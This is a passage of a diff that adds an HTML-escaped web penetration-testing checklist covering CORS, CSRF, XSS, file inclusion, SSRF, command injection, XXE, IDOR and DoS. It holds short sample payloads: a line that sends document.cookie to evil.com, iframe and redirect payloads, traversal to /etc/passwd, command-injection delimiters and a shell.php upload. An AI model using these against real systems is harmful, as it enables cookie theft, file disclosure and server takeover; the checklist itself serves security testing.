+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt; Horizontal (admin-admin &amp;amp; user to user) / Vertical Privilege Escalation (User to admin)&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2-privacy-settings-bugs&#34;&gt;2. Privacy Settings Bugs
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt; (Details missing)&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;3-session-bugs&#34;&gt;3. Session Bugs
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check if session tokens/access tokens:
+&lt;ul&gt;
+&lt;li&gt;Expires on logout&lt;/li&gt;
+&lt;li&gt;Password reset/change&lt;/li&gt;
+&lt;li&gt;Expires on user removal&lt;/li&gt;
+&lt;li&gt;Expires on changing roles&lt;/li&gt;
+&lt;li&gt;Insufficient session fixation (cookie editor extension used)****&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-insecure-cors-misconfiguration&#34;&gt;4. Insecure CORS Misconfiguration
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Curl command to detect: &lt;code&gt;curl &amp;lt;http://site.com&amp;gt; -H &amp;quot;Origin:&amp;lt;http://evil.com&amp;gt;&amp;quot; -I&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Check &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; header:
+&lt;ul&gt;
+&lt;li&gt;`` (not exploitable)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;origin: evil.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;origin: site.evil.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;origin: null&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;If any site disclosing usernames &amp;amp; password, try CORS exploit.&lt;strong&gt;Tool Used:&lt;/strong&gt; Corsy / Burp Suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-csrf&#34;&gt;5. CSRF
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Intercept the victim request &amp;amp; generate CSRF PoC; send to server as an attacker&lt;/li&gt;
+&lt;li&gt;CSRF can be GET or POST based&lt;/li&gt;
+&lt;li&gt;Try in all state-changing requests&lt;/li&gt;
+&lt;li&gt;Use &lt;a class=&#34;link&#34; href=&#34;http://jsfiddle.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;jsfiddle.net&lt;/a&gt; online tool&lt;/li&gt;
+&lt;li&gt;Check if it validates origin/referer. If not, CSRF is possible.&lt;/li&gt;
+&lt;li&gt;Check if it is cookie-based authentication.&lt;/li&gt;
+&lt;li&gt;If anti-CSRF tokens are present:
+&lt;ol&gt;
+&lt;li&gt;Remove anti-CSRF tokens &amp;amp; parameter&lt;/li&gt;
+&lt;li&gt;Pass blank parameter&lt;/li&gt;
+&lt;li&gt;Add similar length token&lt;/li&gt;
+&lt;li&gt;Add another user’s valid anti-CSRF token&lt;/li&gt;
+&lt;li&gt;Random token in long length (e.g., &lt;code&gt;aaaaaaaaa&lt;/code&gt;)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;If content-type verification:
+&lt;ol&gt;
+&lt;li&gt;If no anti-CSRF tokens are present&lt;/li&gt;
+&lt;li&gt;Try content-type: &lt;code&gt;text/plain&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;Flash CSRF&lt;/li&gt;
+&lt;li&gt;Check if any cross-domain policy using SWF JSON tool.&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;http://jsfiddle.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;jsfiddle.net&lt;/a&gt; / Burp Suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-xss&#34;&gt;6. XSS
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Input value (try payload like &lt;code&gt;&amp;quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;quot;&lt;/code&gt;) reflected without XSS protection&lt;/li&gt;
+&lt;li&gt;Use XSS validator - Intruder&lt;/li&gt;
+&lt;li&gt;Host header injection through XSS:
+&lt;ul&gt;
+&lt;li&gt;Add &lt;code&gt;referer: batman&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Add &lt;code&gt;hostheader: bing.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;URL redirection through XSS:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;document.location.href=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Phishing through XSS - iframe injection:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;iframe src=&amp;quot;&amp;lt;http://evil.com&amp;gt;&amp;quot; height=&amp;quot;100&amp;quot; width=&amp;quot;100&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Cookie stealing through XSS:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;document.location.href=&amp;quot;&amp;lt;http://evil.com/p/?page=&amp;gt;&amp;quot; + document.cookie&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;File upload through XSS:
+&lt;ul&gt;
+&lt;li&gt;Upload a picture file, intercept it, and change &lt;code&gt;picture.jpg&lt;/code&gt; to XSS payload using Intruder attack&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Remote File Inclusion (RFI) through XSS:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;php?=http://brutelogic.com.br/poc.svg - xsspayload&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Convert self XSS to reflected one:
+&lt;ul&gt;
+&lt;li&gt;Copy response in a &lt;code&gt;file.html&lt;/code&gt; -&amp;gt; it will work&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;XSS through URI parameters:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;site.com/about/xss&amp;quot;&amp;gt;&amp;lt;script&amp;gt;&lt;/code&gt;&lt;strong&gt;Tool Used:&lt;/strong&gt; XSS Validator / Burp Suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;7-host-header-injection&#34;&gt;7. Host Header Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;URL redirection through host header:
+&lt;ul&gt;
+&lt;li&gt;Check URL having 2xx, 3xx&lt;/li&gt;
+&lt;li&gt;Change &lt;code&gt;X-forwarded-host&lt;/code&gt; to &lt;code&gt;realweb.com&lt;/code&gt; and &lt;code&gt;bing.com&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Web cache poisoning through Host Header Injection:
+&lt;ul&gt;
+&lt;li&gt;Injection will be reflected in any buttons of the page&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Host header attack on password reset page&lt;/li&gt;
+&lt;li&gt;XSS through Host Header Injection****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;8-url-redirection-or-open-redirect&#34;&gt;8. URL Redirection or Open Redirect
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Common parameter list:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dest&lt;/code&gt;, &lt;code&gt;redirect&lt;/code&gt;, &lt;code&gt;uri&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;continue&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;window&lt;/code&gt;, &lt;code&gt;to&lt;/code&gt;, &lt;code&gt;out&lt;/code&gt;, &lt;code&gt;view&lt;/code&gt;, &lt;code&gt;dir&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;, &lt;code&gt;navigation&lt;/code&gt;, &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;u&lt;/code&gt;, &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;val&lt;/code&gt;, &lt;code&gt;validate&lt;/code&gt;, &lt;code&gt;domain&lt;/code&gt;, &lt;code&gt;callback&lt;/code&gt;, &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;page&lt;/code&gt;, &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt;, &lt;code&gt;port&lt;/code&gt;, &lt;code&gt;next&lt;/code&gt;, &lt;code&gt;data&lt;/code&gt;, &lt;code&gt;reference&lt;/code&gt;, &lt;code&gt;site&lt;/code&gt;, &lt;code&gt;html&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Test URLs:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;site.com/bing.com&lt;/code&gt;, &lt;code&gt;site.com//bing.com&lt;/code&gt;, &lt;code&gt;site.com/payloads&lt;/code&gt;****&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;9-parameter-tampering&#34;&gt;9. Parameter Tampering
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt; Apply to ecommerce websites&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;10-html-injection&#34;&gt;10. HTML Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use GET or POST method&lt;/li&gt;
+&lt;li&gt;Input value reflecting back&lt;/li&gt;
+&lt;li&gt;Test with HTML payload like &lt;code&gt;&amp;lt;h1&amp;gt;adam&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;URL redirection via HTML injection****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;11-file-inclusion&#34;&gt;11. File Inclusion
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Local File Inclusion (LFI) &amp;amp; Remote File Inclusion (RFI)&lt;/li&gt;
+&lt;li&gt;For LFI, try:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;any.com/index.php?reference=login.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;For RFI, try:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;any.com/?share=http://evil.com/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Common parameters to look for:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;file&lt;/code&gt;, &lt;code&gt;document&lt;/code&gt;, &lt;code&gt;folder&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;pg&lt;/code&gt;, &lt;code&gt;style&lt;/code&gt;, &lt;code&gt;pdf&lt;/code&gt;, &lt;code&gt;template&lt;/code&gt;, &lt;code&gt;php_path&lt;/code&gt;, &lt;code&gt;doc&lt;/code&gt;, &lt;code&gt;dest&lt;/code&gt;, &lt;code&gt;redirect&lt;/code&gt;, &lt;code&gt;uri&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;continue&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;window&lt;/code&gt;, &lt;code&gt;next&lt;/code&gt;, &lt;code&gt;data&lt;/code&gt;, &lt;code&gt;reference&lt;/code&gt;, &lt;code&gt;site&lt;/code&gt;, &lt;code&gt;html&lt;/code&gt;, &lt;code&gt;val&lt;/code&gt;, &lt;code&gt;validate&lt;/code&gt;, &lt;code&gt;domain&lt;/code&gt;, &lt;code&gt;callback&lt;/code&gt;, &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;page&lt;/code&gt;, &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;port&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt;, &lt;code&gt;to&lt;/code&gt;, &lt;code&gt;out&lt;/code&gt;, &lt;code&gt;view&lt;/code&gt;, &lt;code&gt;dir&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;, &lt;code&gt;navigation&lt;/code&gt;, &lt;code&gt;open&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;For LFI, check:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/var/www/html/&lt;/code&gt; &amp;amp; &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;../../etc/passwd&lt;/code&gt;&lt;strong&gt;Tool Used:&lt;/strong&gt; Lfisuite tool from GitHub&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;12-missing-spf-dmarc-records&#34;&gt;12. Missing SPF, DMARC Records
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Detect missing SPF and DMARC records using:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;mxtoolbox.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;anonymousmail.me&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;https://emkei.cz/&lt;/code&gt;&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;http://mxtoolbox.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;mxtoolbox.com&lt;/a&gt; / &lt;a class=&#34;link&#34; href=&#34;http://anonymousmail.me/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;anonymousmail.me&lt;/a&gt; / &lt;a class=&#34;link&#34; href=&#34;https://emkei.cz/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://emkei.cz/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;13-ssrf-server-side-request-forgery&#34;&gt;13. SSRF (Server-Side Request Forgery)
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Make a request from a vulnerable application to a target website.&lt;/li&gt;
+&lt;li&gt;Common parameters to look for:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dest&lt;/code&gt;, &lt;code&gt;redirect&lt;/code&gt;, &lt;code&gt;uri&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;continue&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt;, &lt;code&gt;window&lt;/code&gt;, &lt;code&gt;next&lt;/code&gt;, &lt;code&gt;data&lt;/code&gt;, &lt;code&gt;reference&lt;/code&gt;, &lt;code&gt;site&lt;/code&gt;, &lt;code&gt;html&lt;/code&gt;, &lt;code&gt;val&lt;/code&gt;, &lt;code&gt;validate&lt;/code&gt;, &lt;code&gt;domain&lt;/code&gt;, &lt;code&gt;callback&lt;/code&gt;, &lt;code&gt;return&lt;/code&gt;, &lt;code&gt;page&lt;/code&gt;, &lt;code&gt;view&lt;/code&gt;, &lt;code&gt;dir&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;, &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;document&lt;/code&gt;, &lt;code&gt;folder&lt;/code&gt;, &lt;code&gt;root&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;pg&lt;/code&gt;, &lt;code&gt;style&lt;/code&gt;, &lt;code&gt;pdf&lt;/code&gt;, &lt;code&gt;template&lt;/code&gt;, &lt;code&gt;php_path&lt;/code&gt;, &lt;code&gt;doc&lt;/code&gt;, &lt;code&gt;feed&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt;, &lt;code&gt;port&lt;/code&gt;, &lt;code&gt;to&lt;/code&gt;, &lt;code&gt;out&lt;/code&gt;, &lt;code&gt;navigation&lt;/code&gt;, &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;result&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Detection using:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;https://www.expressvpn.com/what-is-my-ip&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Burp Collaborator&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;For exploitation, try:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;any.com/index/php?uri=http://external.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Read file from server (e.g., &lt;code&gt;file:///identf&lt;/code&gt; using LFI payloads)&lt;/li&gt;
+&lt;li&gt;Scan internal network (e.g., &lt;code&gt;http://localhost:1&lt;/code&gt; changing the port number to common ports like 21, 22)&lt;/li&gt;
+&lt;li&gt;SSRF with RFI: Execute code from the external domain (e.g., use &lt;code&gt;hackoff.html&lt;/code&gt; with XSS script)&lt;strong&gt;Tool Used:&lt;/strong&gt; Burp Collaborator / &lt;code&gt;https://www.expressvpn.com/what-is-my-ip&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;14-critical-file-found--source-code-disclosure&#34;&gt;14. Critical File Found &amp;amp; Source Code Disclosure
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use payloads from:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Utilize &lt;code&gt;dirsearch&lt;/code&gt;****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;15-subdomain-takeover&#34;&gt;15. Subdomain Takeover
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;If the website is not in use by the target and is hosted on a service provider:
+&lt;ul&gt;
+&lt;li&gt;Sign up on service providers like GitHub, Heroku, Shopify, Zendesk, AWS, Tumblr, etc., to attempt domain takeover&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;github.com/nahamsec/HostileSubBruteforcer&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;16-command-injection&#34;&gt;16. Command Injection
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Take input as a command and reflect the output of that command.&lt;/li&gt;
+&lt;li&gt;Common parameters to look for:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;daemon&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt;, &lt;code&gt;upload&lt;/code&gt;, &lt;code&gt;dir&lt;/code&gt;, &lt;code&gt;execute&lt;/code&gt;, &lt;code&gt;download&lt;/code&gt;, &lt;code&gt;log&lt;/code&gt;, &lt;code&gt;ip&lt;/code&gt;, &lt;code&gt;cli&lt;/code&gt;, &lt;code&gt;cmd&lt;/code&gt;, &lt;code&gt;filename&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Find command injection using delimiter list (e.g., &lt;code&gt;;&lt;/code&gt;, &lt;code&gt;^&lt;/code&gt;, &lt;code&gt;&amp;amp;&lt;/code&gt;, &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;, &lt;code&gt;|&lt;/code&gt;, &lt;code&gt;||&lt;/code&gt;, &lt;code&gt;%0D&lt;/code&gt;, &lt;code&gt;%0A&lt;/code&gt;, &lt;code&gt;\\n&lt;/code&gt;, &lt;code&gt;&amp;lt;&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Identify input fields interacting with the OS shell.&lt;/li&gt;
+&lt;li&gt;Try with delimiter &amp;amp; shell commands (e.g., &lt;code&gt;;dir&lt;/code&gt;, &lt;code&gt;;/etc/passwd&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Intercept requests using Clusterbomb - first parameter for delimiter &amp;amp; second for command payloads&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;github.com/commixproject/commix.git&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;17-file-upload-vulnerability&#34;&gt;17. File Upload Vulnerability
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Simple file upload (e.g., &lt;code&gt;shell.php&lt;/code&gt;) for full control of the server and running shell commands.&lt;/li&gt;
+&lt;li&gt;Use payloads from:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;github.com/fuzzdb-projects/fuzzdb/tree/master/attack/file-upload/malicious-images&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Pixel flood attack.&lt;/li&gt;
+&lt;li&gt;Verify content type.&lt;/li&gt;
+&lt;li&gt;Check extension verification.&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;github.com/almandin/fuxploider&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;18-xxe-injection-xml-external-entity-injection&#34;&gt;18. XXE Injection (XML External Entity Injection)
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use XXE payloads in Intruder to detect.&lt;/li&gt;
+&lt;li&gt;Check if the website is accepting &lt;code&gt;content-type=text/xml&lt;/code&gt; header with a &lt;code&gt;200 OK&lt;/code&gt; response.&lt;/li&gt;
+&lt;li&gt;Use online tool &lt;code&gt;pingb.in&lt;/code&gt; to check for external ping.&lt;/li&gt;
+&lt;li&gt;For blind XXE, use Python’s SimpleHTTPServer (e.g., &lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;SYSTEM &lt;code&gt;file:///etc/passwd&lt;/code&gt; for local file read.&lt;/li&gt;
+&lt;li&gt;SYSTEM &lt;code&gt;http://systemip/readinganyfile&lt;/code&gt; for blind XXE.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;php://&lt;/code&gt; for Remote Code Execution (RCE).&lt;/li&gt;
+&lt;li&gt;Use Gopher or other URI handlers to exploit XXE.&lt;strong&gt;Common Places to Find XXE:&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;XML file upload (e.g., config files)&lt;/li&gt;
+&lt;li&gt;XML input fields&lt;/li&gt;
+&lt;li&gt;XML-based APIs&lt;/li&gt;
+&lt;li&gt;XML-based files (e.g., RSS, SVG)&lt;strong&gt;Tool Used:&lt;/strong&gt; &lt;code&gt;pingb.in&lt;/code&gt; / Burp Suite&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;19-account-lockout&#34;&gt;19. Account Lockout
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Prevent brute-force attacks.&lt;/li&gt;
+&lt;li&gt;Intercept the login page with user credentials using Burp Suite.&lt;/li&gt;
+&lt;li&gt;Send the request to Sequencer.&lt;/li&gt;
+&lt;li&gt;Alternatively, use Intruder to make multiple requests (e.g., 1000 times).&lt;/li&gt;
+&lt;li&gt;Perform credential stuffing.&lt;/li&gt;
+&lt;li&gt;Ensure the account locks out for 30 minutes to 24 hours.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;20-blind-xss&#34;&gt;20. Blind XSS
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;A type of stored XSS where attacker input is saved in the server and stored in the database.&lt;/li&gt;
+&lt;li&gt;It won’t be reflected immediately.&lt;/li&gt;
+&lt;li&gt;Look for blind XSS in pages like:
+&lt;ul&gt;
+&lt;li&gt;Contact us&lt;/li&gt;
+&lt;li&gt;Log viewers&lt;/li&gt;
+&lt;li&gt;Feedback pages&lt;/li&gt;
+&lt;li&gt;Chat apps&lt;/li&gt;
+&lt;li&gt;Ticket generation apps&lt;/li&gt;
+&lt;li&gt;Any app using moderation or updates&lt;/li&gt;
+&lt;li&gt;Saving forms&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Use the online tool &lt;code&gt;xsshunter.com&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Copy the payload and paste it in the input field.&lt;/li&gt;
+&lt;li&gt;Reflection will be found on &lt;code&gt;xsshunter.com&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Perform multiple blind XSS using Intruder.**** / &lt;a class=&#34;link&#34; href=&#34;http://xsshunter.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;XSSHunter.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;21-buffer-overflow-web&#34;&gt;21. Buffer Overflow (Web)
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Intercept the login page and pass a long string of passwords or other inputs. Observe if the page loads slowly.&lt;/li&gt;
+&lt;li&gt;Types of overflows to consider: Buffer, Stack, Heap, Integer, Format String.&lt;/li&gt;
+&lt;li&gt;Denial of Service (DoS) attacks using buffer overflow can be attempted.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;22-cms-vulnerability-hunting&#34;&gt;22. CMS Vulnerability Hunting
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Target common CMS platforms: WordPress, Joomla, Drupal, vBulletin, Magento.&lt;/li&gt;
+&lt;li&gt;Identify vulnerable components within the CMS.&lt;/li&gt;
+&lt;li&gt;Search for exploits using Google.&lt;strong&gt;Tools Used:&lt;/strong&gt; WPScan, CMSMap, CMSSCAN, Joomscan, Drupwn, vBulletin Scanner, Mage Scanner, OWASP VBScan&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;23-idor-insecure-direct-object-references&#34;&gt;23. IDOR (Insecure Direct Object References)
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Scenario 1:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Often found in user settings or profile management.&lt;/li&gt;
+&lt;li&gt;Requires two accounts.&lt;/li&gt;
+&lt;li&gt;Intercept the request and change the email ID of the attacker.&lt;/li&gt;
+&lt;li&gt;Log out and attempt to log in with the victim&amp;rsquo;s account to see if the change was successful.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Scenario 2: User Moderation:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find the user ID.&lt;/li&gt;
+&lt;li&gt;Replace the victim’s ID with the attacker’s ID.&lt;/li&gt;
+&lt;li&gt;Perform the functionality to see if access is granted.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;24-long-password-dos-attack&#34;&gt;24. Long Password DoS Attack
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Approach:&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Hashing passwords can be resource-intensive, leading to potential DoS.&lt;/li&gt;
+&lt;li&gt;Similar to buffer overflow attacks but specifically targeting password fields without length limits.&lt;/li&gt;
+&lt;li&gt;Sign up for an account and intercept the request.&lt;/li&gt;
+&lt;li&gt;Input a password longer than the typical length and forward the request.&lt;/li&gt;
+&lt;li&gt;This can cause application DoS.****&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;25-no-rate-limiting-vulnerability-logical-flow&#34;&gt;25. No Rate Limiting Vulnerability (Logical Flow)
